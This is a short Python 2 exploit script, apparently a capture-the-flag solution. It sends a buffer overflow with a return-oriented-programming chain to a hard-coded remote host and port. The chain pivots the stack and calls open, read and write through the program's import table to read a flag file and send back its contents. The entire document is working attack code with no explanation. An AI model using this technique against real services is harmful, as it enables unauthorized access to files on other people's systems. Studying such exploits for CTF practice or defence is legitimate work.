#!/usr/bin/env python
from struct import *
import socket

buff		= 0x0804a100
flag_str	= 0x0804a200
flag_file	= 0x080487D0
popx2_ret	= 0x0804879E
popx3_ret	= 0x0804879D
leave_ret	= 0x080484f8
plt_read	= 0x080483E0
plt_open	= 0x08048420
plt_write	= 0x08048450
read_80_bytes	= 0x0804865C 
exit		= 0xf7e31a63
rh_p		= ("210.61.8.96", 51342)

payload1 = "\x00" * 108
payload1 += pack("<I", read_80_bytes)
payload1 += pack("<I", popx2_ret)
payload1 += pack("<I", buff)
payload1 += pack("<I", buff-0x4)
payload1 += pack("<I", leave_ret)

payload2 = pack("<I", plt_open)
payload2 += pack("<I", popx2_ret)
payload2 += pack("<I", flag_file)
payload2 += pack("<I", 0x0)

payload2 += pack("<I", plt_read)
payload2 += pack("<I", popx3_ret)
payload2 += pack("<I", 0x3)
payload2 += pack("<I", flag_str)
payload2 += pack("<I", 0x40)

payload2 += pack("<I", plt_write)
payload2 += pack("<I", popx3_ret)
payload2 += pack("<I", 0x1)
payload2 += pack("<I", flag_str)
payload2 += pack("<I", 0x40)

payload2 += pack("<I", exit)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(rh_p)

sock.send(payload1+payload2)
print sock.recv(0x40)
sock.close()
